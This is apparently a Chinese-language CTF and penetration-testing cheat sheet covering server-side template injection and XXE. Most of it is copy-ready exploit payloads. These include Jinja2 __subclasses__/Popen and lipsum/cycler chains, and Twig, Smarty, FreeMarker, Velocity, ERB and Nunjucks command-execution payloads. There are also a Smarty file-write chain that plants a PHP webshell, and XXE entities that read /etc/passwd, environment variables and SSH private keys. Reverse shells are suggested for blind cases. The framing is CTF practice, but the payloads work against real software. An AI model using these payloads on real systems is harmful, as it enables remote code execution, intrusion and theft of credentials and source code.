## [g3] SSTI - Jinja2——Jinja2 模板注入：探测 → 逃逸链 → RCE 三步走
### [ssti-detect] SSTI 检测与引擎区分 | easy | SSTI;Jinja2 | template injection
> 用算术与字符串乘法探测模板注入点并区分引擎

#### 这个条目的作用
SSTI（服务端模板注入）：用户输入被当成模板代码在服务器上渲染。检测要回答两个问题——① 这个输入点到底会不会渲染；② 用的是哪个模板引擎。回答了这两点，后面才能选对 payload。本条目只负责"探测与区分"，不负责 RCE。

#### 前置条件
- 一个"会把用户输入渲染进模板"的输入点：搜索框、用户名/昵称、邮箱、报错信息、导出报表参数等
- 你能往这个参数里传任意文本（Burp 抓包直接改参数即可）
- 目标框架没禁用模板表达式（CTF 靶机默认不禁）

#### 第 1 步：先传一个普通字符串做基线
把参数改成 `hello` 提交，记下页面输出。这一步给你后面判断"有没有变化"的对照。

#### 第 2 步：用算术表达式探测是否渲染
把参数改成：

```txt
{{7*7}}
```

- 预期结果：页面输出 `49` → 存在模板注入（表达式被求值了）
- 原样输出 `{{7*7}}`（照抄不解析）→ 这个点没进模板渲染，是普通反射，换别的参数/接口再试
- 输出空或 404 → 可能被 WAF 拦了 `{{`，看第 5 步

#### 第 3 步：用字符串乘法区分是不是 Jinja2
把参数改成：

```txt
{{7*'7'}}
```

- **Jinja2（Python）**：输出 `7777777`（7 个字符 '7' 重复 7 次）——这是 Jinja2 的特征行为
- Twig（PHP）：输出 `49`（Twig 把字符串转成数字再乘）
- Nunjucks（Node）：输出 `49`（JS 把字符串转数字）
- 报错：引擎不支持字符串乘法，去第 4 步换其他家族的探测

字符串乘法是区分 Jinja2 与 Twig/Nunjucks 的关键一步，三个引擎同一输入三种结果。

#### 第 4 步：基础探测其他引擎
| 输入 | 输出 | 引擎 |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | `7777777` | **Jinja2**（特征） |
| `{{7*'7'}}` | 49 | Twig / Nunjucks（数字转换） |
| `${7*7}` | 49 | JVM 系：FreeMarker / Velocity / EL |
| `<%= 7*7 %>` | 49 | Ruby ERB |
| `{% if 1 %}1{% endif %}` | `1` | 语句块可执行，确认 Twig 系/Jinja2 |

`${...}` 生效基本就是 Java 系，`<%= %>` 生效就是 Ruby 系；把探测结果记下来，第 6 步按家族进对应条目。

#### 第 5 步：表达式被转义/过滤时的补充探测
- `{{7*7}}` 原样输出但没报错 → 试试语句块 `{% if 1 %}OK{% endif %}`，输出 `OK` 说明 `{%...%}` 没被滤
- 试试加空格/Tab 的变体：`{{ 7*7 }}`、`{{7*7}}` 前插 `%0a`（换行编码）
- 如果页面有 HTML 转义（`&amp;` 之类），切换看 Burp 的原始响应报文，浏览器渲染会骗人

#### 第 6 步：确认引擎后进入对应条目
- Jinja2 → [ssti-escape]（逃逸链）或 [ssti-rce]（短链，优先）
- Twig / Smarty → [ssti-twig-smarty]
- FreeMarker / Velocity / ERB / Nunjucks → [ssti-java-other]

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `{{7*7}}` 原样输出 | 该参数根本不经过模板渲染 | 换参数名/接口；模板常渲染名称、搜索词、报错字段 |
| `{{7*'7'}}` 输出 49 而非 7 个 7 | 是 Twig/Nunjucks 不是 Jinja2 | 按引擎换条目，别硬套 Jinja2 逃逸链 |
| 页面看不到结果，但 Burp 响应里有需解码内容 | 输出被转义/截断 | 看原始响应；结果在 `49` 附近的转义形式里 |
| `{{7*7}}` 请求直接 400/500 | WAF 拦 `{{` | 试用 `{%...%}`、`${...}`、编码变体送达 |
| 所有探测都原样 | 双大括号被服务端替换/该点无渲染 | 找"二次渲染点"：模板字符串被存库后再渲染 |

#### 实战要点
- 探测顺序固定：先算术确认"会不会渲染"，再字符串乘法确认"是不是 Jinja2"，最后按家族选 payload
- `{{7*'7'}}` 是 Jinja2 与 Twig 的"一锤定音"区别点，别省
- 多个输入点全测一遍，模板渲染常只落在个别字段（昵称、标题、搜索词）
- 用 Burp 看原始响应判断，别被浏览器渲染骗了
- 确认引擎的功夫永远值得花：选对 payload 一次就打穿，猜错引擎试到天荒地老

### [ssti-escape] class 逃逸链与 Popen 定位 | medium | SSTI;Jinja2;逃逸 | mro chain
> 从字符串对象沿 __class__.__mro__ 找到 subprocess.Popen 执行命令

#### 这个条目的作用
Jinja2 模板默认只能访问白名单对象（字符串、数字、内置函数），拿不到 `os` 等危险模块。逃逸链的核心思路：从任意一个对象出发，用 `__class__`（对象→类）、`__mro__`（类→父类）、`__subclasses__()`（父类→所有子类）三个魔法属性，遍历出当前 Python 进程加载的**所有类**，在里面找到 `subprocess.Popen` 来执行系统命令。本条目把这条链逐步拆开，每步都有"看什么输出、报错怎么办"。

#### 前置条件
- 已确认注入点是 Jinja2（见 [ssti-detect]）
- 页面能回显表达式结果（无回显请直接跳到 [ssti-rce] 用短链 + sleep 盲注）
- `_`、`[`、`'` 未被完全过滤（被过滤见第 7 步 attr 方案）

#### 第 1 步：从字符串对象拿到它的类
输入：

```python
{{''.__class__}}
```

预期输出：`<class 'str'>`。`''` 是空字符串对象，`.__class__` 返回它所属的类。这一步通了，后面才走得下去。

#### 第 2 步：看类的继承链
```python
{{''.__class__.__mro__}}
```

预期输出：`(<class 'str'>, <class 'object'>, ...)` 的元组。`__mro__` 是"方法解析顺序"，从自身一路排到祖宗 `object`。

#### 第 3 步：定位祖宗类 object
```python
{{''.__class__.__mro__[1]}}
```

预期输出：`<class 'object'>`。`__mro__[0]` 是 `str` 自己，`[1]` 就是所有类的共同祖先 `object`。

#### 第 4 步：列出 object 的所有子类
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

预期输出：一长串 `[<class 'type'>, <class 'weakref'>, ...]`——这是当前 Python 进程加载的所有类的列表，`subprocess.Popen` 就藏在里面。列表很长被截断没关系，下一步用循环精确定位。

#### 第 5 步：枚举子类列表，定位 Popen 的下标
把下面整段贴进注入点：

```python
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in c.__name__ %}{{loop.index0}},{% endif %}{% endfor %}
```

- 预期：输出一个数字（如 `413,`），那个数字就是 Popen 在子类列表里的下标 `N`
- 关键：`loop.index0` 才是下标（从 0 数）；`loop.index` 从 1 数，用了会差一位
- 没输出任何数字：这个环境没有 Popen，跳去 [ssti-rce] 用短链，别在这里死磕

#### 第 6 步：用 Popen 执行命令
把第 5 步拿到的 `N` 填进去：

```python
{{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}
```

- 预期：输出 `(b'uid=0(root) gid=0(root) ...\n', None)`，命令执行成功
- 参数解释：`shell=True` 让命令走 shell，支持管道和重定向；`stdout=-1` 就是 `subprocess.PIPE`，把命令输出接到可读的地方；`.communicate()` 返回 `(stdout, stderr)` 元组
- 读 flag：把 `'id'` 换成 `'cat /flag'`，不行就 `'cat /flag.txt'`（路径套路见 [cmdi-readflag]）

#### 第 7 步：`_` 和 `[` 被过滤时的等价写法
Jinja2 的 `attr` 过滤器可以用点式访问替代 `__x__` 和下标：

```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}
```

这段和 `''.__class__.__mro__[1].__subclasses__()` 完全等价：`|attr('__class__')` 替 `.__class__`，`|attr('__getitem__')(1)` 替 `[1]`。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 枚举循环无输出 | 该环境没有 Popen（嵌入环境/裁剪版 Python） | 去 [ssti-rce] 用 lipsum/cycler 短链 |
| 枚举输出多个数字 | 同名的类出现多次 | 任选一个试，不行换下一个 |
| 执行报 `TypeError` | Popen 参数拼错 | 固定用 `(cmd, shell=True, stdout=-1)` 收尾 `.communicate()` |
| 输出是 `b'...'` 字节串 | communicate() 返回 bytes | 内容照读，flag 是 ASCII 不受影响 |
| 用 `loop.index` 取下标总错位 | 下标从 0 开始 | 改用 `loop.index0` |
| 页面 500 | 某步表达式写错或链太长被截 | 逐步回退，先确认走到第几步还有输出 |

#### 实战要点
- 主线就三连：`__class__` → `__mro__[1]` → `__subclasses__()`，其余全是它的变体
- Popen 的下标 `N` 每次环境都不同（import 顺序、Python 版本），必须现场枚举，禁止背死
- `stdout=-1` 等价于 PIPE，是"把命令输出接回页面"的关键一笔
- 无回显环境别用这条链，直接短链 + sleep 盲注
- 过滤 `_`/`[` 时 `|attr(...)` 全套替换，一条链能写完整
- 逃逸链很长，易被按长度过滤的 WAF 拦，优先试 [ssti-rce] 的短链

### [ssti-rce] 短链 RCE 模板与盲注判定 | medium | SSTI;Jinja2;RCE | popen rce
> 从内置对象取 os 模块执行命令，sleep 判定 RCE

#### 这个条目的作用
逃逸链要写一长串，容易被过滤或超长。Jinja2 环境自带一些全局对象（`lipsum`、`cycler`；Flask 还有 `url_for`、`config`），它们的 `__globals__` 字典里常常直接躺着 `os` 模块——于是"取对象 → __globals__ → os.popen → read"四步就能打，比 [ssti-escape] 短得多。本条目给出短链全集和无回显判定法。

#### 前置条件
- 注入点是 Jinja2（Flask 应用最典型，纯 Jinja2 也行）
- 先跑一步"侦察"确认 os 在不在，别盲猜

#### 第 1 步：侦察 globals 里有什么
```python
{{lipsum.__globals__.keys()}}
```

预期：输出一团 dict 键名，看 `os` 或 `builtins` 在不在列。没有 os 也没关系，还有 `__builtins__` 兜底（第 4 步）。

#### 第 2 步：lipsum 短链（首选，最短）
```python
{{lipsum.__globals__['os'].popen('id').read()}}
```

- 预期：输出 `uid=0(root) gid=0(root)...`
- 读 flag：`{{lipsum.__globals__['os'].popen('cat /flag').read()}}`
- 挂了的原因通常是 lipsum 在当前 Jinja2 版本不存在 → 换第 3 步

#### 第 3 步：其他内置对象短链（逐个试）
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__['os'].popen('cat /flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

- `cycler` 是 Jinja2 自带全局，比 lipsum 稳
- `url_for`、`config` 只在 Flask 里存在（靠 Flask 的导入链带上了 os）
- 逐个放进去试，哪个输出 uid 行就用哪个

#### 第 4 步：os 不在 globals 时的 __builtins__ 兜底
globals 里没有 os，但一定有 `__builtins__`（Python 内置命名空间），从它拿 `__import__` 再导入 os：

```python
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

- 预期：同样输出 uid 行
- 报 `TypeError`（`__builtins__` 是模块对象不能下标）→ 换属性访问：`{{lipsum.__globals__['__builtins__'].__import__('os').popen('id').read()}}`

#### 第 5 步：无回显时的盲注判定
页面看不到任何输出时，用 sleep 制造可观察的延迟：

```python
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
```

- 预期：请求停顿约 5 秒再返回 → RCE 成立（sleep 被真的执行）
- 用 Burp 计时或 curl `-w '%{time_total}'` 观察
- 确认有 RCE 后，配合写文件/反弹 shell 取数据（思路见 [cmdi-blind]）

#### 第 6 步：应急——`_`、`[` 被过滤
用 attr 过滤器替换下划线，用"."键访问替换下标：

```python
{{lipsum|attr('__globals__').os.popen('id').read()}}
```

Jinja2 里 `字典.key` 会先试属性、再试键，所以 `.os` 等价于 `['os']`。引号也被过滤的更深场景属于 WAF 绕过分片的范围，本文档不讲。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `'os'` 不在 globals 键里 | 该对象所在模块没 import os | 先 `{{lipsum.__globals__.keys()}}` 看键，再用 `__builtins__` 兜底 |
| 页面只输出空/None | 忘写 `.read()` | 检查是否结尾少 `.read()` |
| `url_for`/`config` 未定义 | 不是 Flask 环境 | 换 `lipsum`/`cycler`，Flask 特有的别用 |
| sleep 盲注无延迟 | 注入点根本没渲染 | 回 [ssti-detect] 先确认注入点 |
| WAF 拦 `[`/`_` | 字符过滤 | attr 过滤器 + 点键访问重写 |
| 所有短链都 500 | 表达式语法/超长 | 逐步拆分：先只跑 `{{lipsum}}` 确认对象存在 |

#### 实战要点
- 顺序固定：lipsum → cycler → url_for/config，短到长逐个试
- 永远先 `keys()` 侦察再取值；`__builtins__` 是最后的万能兜底
- 无回显只用 sleep 判定 RCE，别浪费时间去猜输出
- 短链的本质：某个对象所在模块的全局命名空间里正好有 os
- 确认 RCE 后立刻读 flag：`cat /flag` → `cat /flag.txt` → `find / -name '*flag*'`（[cmdi-readflag]）
## [g4] SSTI - 其他引擎——非 Jinja2 引擎：先识别引擎，再选对应 RCE payload
### [ssti-twig-smarty] Twig 与 Smarty 速查 | medium | SSTI;Twig;Smarty;PHP | twig injection
> PHP 两大模板引擎的检测与命令执行 payload

#### 这个条目的作用
PHP 世界最常见的两个模板引擎是 Twig（Symfony/Laravel）和 Smarty。它们的注入点表现和 payload 都与 Jinja2 完全不同，不能通用。本条目给出两套独立的"检测 → 版本 → RCE"流程，每条 payload 都标了适用版本。

#### 前置条件
- 已确认是 PHP 模板（提交参数后内容被渲染进 `.twig`/`.tpl` 页面）
- 先分清是哪个：Twig 用 `{{...}}` + `{%...%}`，Smarty 用 `{$...}` + `{if...}{/if}`
- 版本敏感：所有 payload 先看版本再用

#### Twig 部分

#### 第 1 步：Twig 检测
```php
{{7*7}}
```

预期：输出 `49` → Twig 注入点成立。注意 Twig 里 `{{7*'7'}}` 输出 `49`（字符串被转数字再乘），和 Jinja2 出 7 个 7 相反，别搞混。

#### 第 2 步：Twig 经典 RCE（老版本 1.x ~ 2.11）
```php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

- 原理：先把 `exec` 注册为"未定义过滤器"的回调，再触发一次 `getFilter('id')`，`exec('id')` 被执行
- 预期：输出 uid 行
- 限制：`registerUndefinedFilterCallback` 在 Twig 2.12+ 已移除，这条链只对老版本有效

#### 第 3 步：Twig filter 组合（部分版本）
```php
{{['id','']|filter('system')}}
```

- 原理：把数组元素挨个过名为 system 的过滤器，`'id'` 被当命令执行
- 同样版本敏感：依赖上下文允许未定义过滤器回调的旧配置
- 不通用就别恋战：先确认版本再决定用哪条链

#### 第 4 步：版本指纹与出路
- 报错页/响应头常见 Twig 版本号（如 `Twig 2.7`）
- `{{7*7}}` 正常但上面两条链全挂 → 新版 Twig，SSTI 直接 RCE 的路大多被堵，换其他攻击面（二次渲染、别的漏洞类型），别在这里耗

#### Smarty 部分

#### 第 5 步：Smarty 版本指纹
```php
{$smarty.version}
```

预期：输出版本号（如 `3.1.30`），版本决定后面哪条 payload 可用。

#### 第 6 步：Smarty 3 函数调用
```php
{if system('id')}{/if}
```

- 预期：输出 uid 行 → RCE 成功
- 条件：未开 security policy（CTF 靶机默认开不了那么严）
- 换命令：`{if system('cat /flag')}{/if}`

#### 第 7 步：Smarty {php} 标签（老版本）
```php
{php}system('id');{/php}
```

- Smarty 3.1 起 `{php}` 默认禁用（报 untrusted PHP tag 之类错误），≤3.0 或显式开了 `allow_php_templates` 才可用
- 老版本直接写 PHP 就是 RCE，最痛快的链

#### 第 8 步：进阶——写文件 getshell（Smarty ≤ 3.1.31 特定链）
```php
{Smarty_Internal_Write_File::writeFile('/var/www/html/shell.php','<?php system($_GET["c"]);?>',self::clearConfig())}
```

- 对应 CVE-2017-1000480 的利用形态：Smarty 3.1.31 及以下、未限制 PHP 类访问的配置可用
- 成功后访问 `/shell.php?c=id` 就是 webshell
> [!warn] 这条链依赖具体版本与配置，先拿版本指纹，链失败就换思路，别在一条链上死磕。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `_self.env` 链报 undefined | Twig 2.12+/3.x 已移除该接口 | 确认版本；新版 Twig 换攻击面 |
| `{php}` 报错被拒 | 3.1+ 默认禁用 | 用 `{if system()}` 或找允许模板的配置 |
| `{$smarty.version}` 无输出 | 不是 Smarty 或版本变量被禁 | 回到检测，确认引擎 |
| filter 链无反应 | 上下文不允许未定义过滤器 | 版本对不上，别硬试 |
| 输出被 HTML 转义 | 渲染后才做转义 | 看 Burp 原始响应 |

#### 实战要点
- Twig 与 Smarty 语法完全不同，第一步永远是分清是哪个
- 版本决定一切：老链必须先看版本指纹再上
- Twig 首选 `_self.env` 链（老版）；Smarty 首选 `{if system()}`（3.x）
- `{php}` 是 Smarty 的"终极形态"，但 3.1+ 默认关闭
- 新版 Twig 的 SSTI 很难直接 RCE，别浪费时间，考虑其他漏洞类型
- 所有 payload 以"回显 uid 行或页面延迟"为成功判据

### [ssti-java-other] FreeMarker/Velocity/ERB/Nunjucks | hard | SSTI;FreeMarker;Velocity;ERB | java ssti;erb;nunjucks
> 其余引擎检测与 RCE payload 对照

#### 这个条目的作用
Jinja2/Twig/Smarty 之外的引擎，各给一条"检测 + RCE"完整对照：Java 系 FreeMarker、Velocity，Ruby 的 ERB，Node 的 Nunjucks。这些引擎语法差异极大，payload 不可混用——先指认引擎，再照抄对应 payload。

#### 前置条件
- 已用 [ssti-detect] 的探测表排除 Jinja2/Twig
- 记住三条线索：`${...}` 生效 → Java 系（FreeMarker/Velocity/EL）；`<%= %>` 生效 → Ruby；`{{...}}` 生效且应用是 Node → Nunjucks
- 每条 payload 注意版本边界

#### 第 1 步：FreeMarker 检测
```java
${7*7}
```

预期：输出 `49` → FreeMarker 注入点。

#### 第 2 步：FreeMarker RCE（老版本）
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

- 预期：输出 uid 行
- 原理：用 `?new()` 实例化模板引擎自带的 Execute 工具类，它内部包装了命令执行
- 限制：FreeMarker 2.3.29+ 默认禁止 `?new()` 实例化任意类，这条链只对老版本直接可用

#### 第 3 步：Velocity 检测与 RCE
检测：

```java
#set($x=7*7)${x}
```

预期：输出 `49`。RCE（执行命令但无回显）：

```java
#set($x="")$x.class.forName("java.lang.Runtime").getRuntime().exec("id")
```

- 原理：`$x.class` 是 String 的 Class 对象，`forName("java.lang.Runtime")` 拿到 Runtime 类，`getRuntime().exec("id")` 执行命令
- 无回显的取数方式：反弹 shell（命令别带裸空格，用 `bash -c {echo,base64}|{base64,-d}|bash` 形式），或命令写文件后二次读取

#### 第 4 步：ERB（Ruby）检测与 RCE
```erb
<%= 7*7 %>
```

预期：输出 `49`。RCE 三连（任选一条）：

```erb
<%= system('id') %>
<%= `id` %>
<%= %x(id) %>
```

- 反引号和 `%x()` 是同一种"执行系统命令"的 Ruby 语法
- `system('id')` 会把 id 的输出打到页面，返回 true

#### 第 5 步：Nunjucks（Node）检测与 RCE
Nunjucks 语法和 Jinja2 很像（都是 `{{...}}`），但 `{{7*'7'}}` 输出 `49`（JS 数字转换），用这条和 Jinja2 区分。RCE：

```js
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

- 原理：`range` 是 Nunjucks 全局，`.constructor` 是 Function 构造器，把字符串当函数体执行，`require('child_process').execSync('id')` 执行命令
- 引号规则：外层函数体用双引号，内层 `'child_process'`、`'id'` 用单引号，写反会 SyntaxError
- `process.mainModule` 为 undefined（新版 Node）时换 `global.process` 前缀重试

#### 第 6 步：JSP EL 的坑
`${...}` 也可能来自 JSP EL / Spring EL 而不是 FreeMarker。JSP EL 3.0 默认禁止静态方法调用（`${''.getClass()...}` 直接挂），绝大多数 RCE payload 不可用。
> [!danger] 确认 `${7*7}` 出 49 后，先分清 FreeMarker 还是 JSP EL / Spring EL；EL 系别急着写链，确认版本再决定，多数情况要换攻击面。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `${7*7}` 出 49 但 FreeMarker payload 挂 | 是 JSP EL/Spring EL，不是 FreeMarker | 看报错页与框架指纹；EL 系另找入口 |
| `<#assign>` 报错 | FreeMarker 2.3.29+ 限制 `?new` 目标类 | 确认版本；老版本才直接可用 |
| Velocity 执行无输出 | Runtime.exec 默认不回显 | 反弹 shell / 写文件旁证执行 |
| Nunjucks 报 SyntaxError | 引号嵌套写反 | 外双内单，逐层核对 |
| Nunjucks 报 module not found | process.mainModule 为 undefined | 换 `global.process.mainModule` 前缀重试 |
| 所有 payload 都 500 | 服务端抛异常但命令可能已执行 | 看异常栈确认引擎与版本 |

#### 实战要点
- 先指认引擎和版本，再翻 payload 表——每条都有明确版本边界
- 形态速记：FreeMarker/EL/Velocity 吃 `${}`，ERB 吃 `<%= %>`，Nunjucks 吃 `{{}}` 但字符串乘法像 Twig
- Velocity 的 exec 无回显，判据用反弹 shell 上线或写文件
- Nunjucks 与 Jinja2 长得像，`{{7*'7'}}` 一测便知：7 个 7 是 Jinja2，49 是 Nunjucks
- 分不清 EL 还是 FreeMarker 时看报错：Spring 报 EL 语法错，FreeMarker 会带模板行号
- RCE 成功后的 flag 读取套路通用，见 [cmdi-readflag]
## [g5] XXE——XML 外部实体：本地读文件、盲外带、SSRF 三面
### [xxe-read] XXE 读文件与 php filter | easy | XXE;读文件 | xml entity
> DTD 实体读本地文件与 PHP 伪协议读源码

#### 这个条目的作用
XXE（XML 外部实体注入）：应用解析用户可控的 XML，而解析器允许 DTD 引用外部实体。把实体指向 `file:///etc/passwd`，文件内容就被填进 XML 输出回显——这就是"有回显读文件"。本条目覆盖：基础读文件 payload、PHP 伪协议读源码、常用目标清单、常见报错定位。

#### 前置条件
- 找到 XML 输入点：XML 上传接口、SOAP 接口、`Content-Type: application/xml` 的接口、被解析的配置文件上传
- 页面会回显 XML 解析结果（无回显场景见 [xxe-blind]）

#### 第 1 步：找 XML 输入点
- 抓包看有没有接口接受 `text/xml`、`application/xml`
- JSON 接口也能试：把 `Content-Type` 改成 `application/xml`，body 换成 XML——很多后端两种都解析

#### 第 2 步：基础探测 payload（读 /etc/passwd）
把整个请求 body 换成：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

- 预期：响应里出现 `root:x:0:0:root:/root:/bin/bash` 之类的行 → XXE 成立
- 语法拆解：`<!DOCTYPE foo [...内部DTD...]>` 声明文档类型；`<!ENTITY xxe SYSTEM "file:///etc/passwd">` 定义外部实体 xxe 指向本地文件；`&xxe;` 在正文里引用
- 只回显空或报实体未定义 → 看排查表

#### 第 3 步：换常用目标确认
| 目标 | 用途 |
|---|---|
| `file:///etc/passwd` | 用户枚举（首测） |
| `file:///etc/hostname` | 主机名指纹 |
| `file:///proc/self/environ` | 环境变量，可能直接含 flag/密钥 |
| `file:///flag` / `file:///flag.txt` | CTF 靶机常见 flag 位置 |
| `file:///root/.ssh/id_rsa` | SSH 私钥（有权限时） |

#### 第 4 步：PHP 伪协议读源码
目标应用是 PHP 时，用 `php://filter` 读文件内容（base64 编码输出，避免二进制/编码异常）：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">]>
<foo>&xxe;</foo>
```

- 预期：响应里是一段 base64，本地解码（`echo '...' | base64 -d`）就是 index.php 源码
- 换文件：改 `resource=` 后面的路径，config.php 里常有数据库密码
- `php://filter` 是 PHP 专属；Java/Python 环境用 `file://` 照常

#### 第 5 步：无输出的快速定位
- 响应完全空 → 解析器可能没加载外部实体（默认配置差异），试参数实体变体（[xxe-blind] 的 DTD 外带模板），同时用 `http://` 实体测 SSRF 确认解析器行为（[xxe-adv]）
- 报错信息里带文件内容 → 属于半盲回显，同样可利用

#### 第 6 步：无回显的出路
有回显前提不满足时别在 [xxe-read] 死磕：去 [xxe-blind] 用外部 DTD 把文件 base64 外带到你自己的服务器。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 响应空、无文件内容 | 解析器默认不加载外部实体（PHP 需 LIBXML_NOENT 等） | 试 http 实体确认解析器行为；或转盲 XXE 外带 |
| 报 `Entity 'xxe' not defined` | XML 语法/DOCTYPE 位置错 | 逐字对照模板，`<!ENTITY>` 必须在 `<!DOCTYPE ... [ ]>` 里 |
| 输出乱码/二进制 | 读了二进制文件 | 换文本目标，或 php://filter + base64 |
| base64 输出为空 | filter 链拼写错 | 用 `php://filter/read=convert.base64-encode/resource=绝对路径` 完整写法 |
| JSON 接口不解析 XML | 后端只认 JSON | 换 `Content-Type: application/xml` 再试 |

#### 实战要点
- 第一条永远试 `file:///etc/passwd`，有回显直接拿分
- `&xxe;` 是一般实体用在正文；做外带/嵌套时改参数实体 `%xxe;`（[xxe-blind]）
- PHP 环境读源码优先 `php://filter` + base64；读完 index.php 顺手读 config.php
- JSON 接口 ≈ XML 接口：改 Content-Type 就能切换测试面
- 确认 XXE 后顺手试 `file:///proc/self/environ`，环境变量里常有冷门 flag
- 无回显立即转 [xxe-blind] 外带模板，直接抄